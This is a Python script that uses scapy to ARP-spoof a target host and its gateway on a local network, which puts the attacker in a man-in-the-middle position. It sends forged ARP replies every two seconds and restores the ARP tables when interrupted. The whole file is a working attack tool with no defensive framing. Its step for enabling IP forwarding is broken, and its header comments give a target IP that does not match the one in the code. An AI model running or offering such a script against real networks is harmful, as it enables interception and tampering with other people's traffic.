#/usr/bin/python3
# target ip = 192.168.1.4
# spoof_ip = 192.168.1.1

#----------------------------------------------------------------------------
#  command for port forwarding::      echo 1 > /proc/sys/net/ipv4/ip_forward
#----------------------------------------------------------------------------


import scapy.all as scapy
import time
import subprocess

def create_queue():
    {
        subprocess.call(["sudo", "echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    }

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose = False)[0] # srp - send recieve packets ,used[0] because srp usually returns ans and unans
    
    return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)     # op is set to indicate response packet  pdst is the ip of the target
    #print(packet.show())
    #print (packet.summary())
    scapy.send(packet,verbose=False)


def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


create_queue()
sent_packets_count = 2
target_ip ="192.168.1.7"
gateway_ip ="192.168.1.1"
try:
    while(True):
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        print("\r[+] packet sent: " + str(sent_packets_count) ,end="")
        sent_packets_count += 2
        time.sleep(2)
except(KeyboardInterrupt):
    print("\n[+] Resetting ARP wait ...\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)

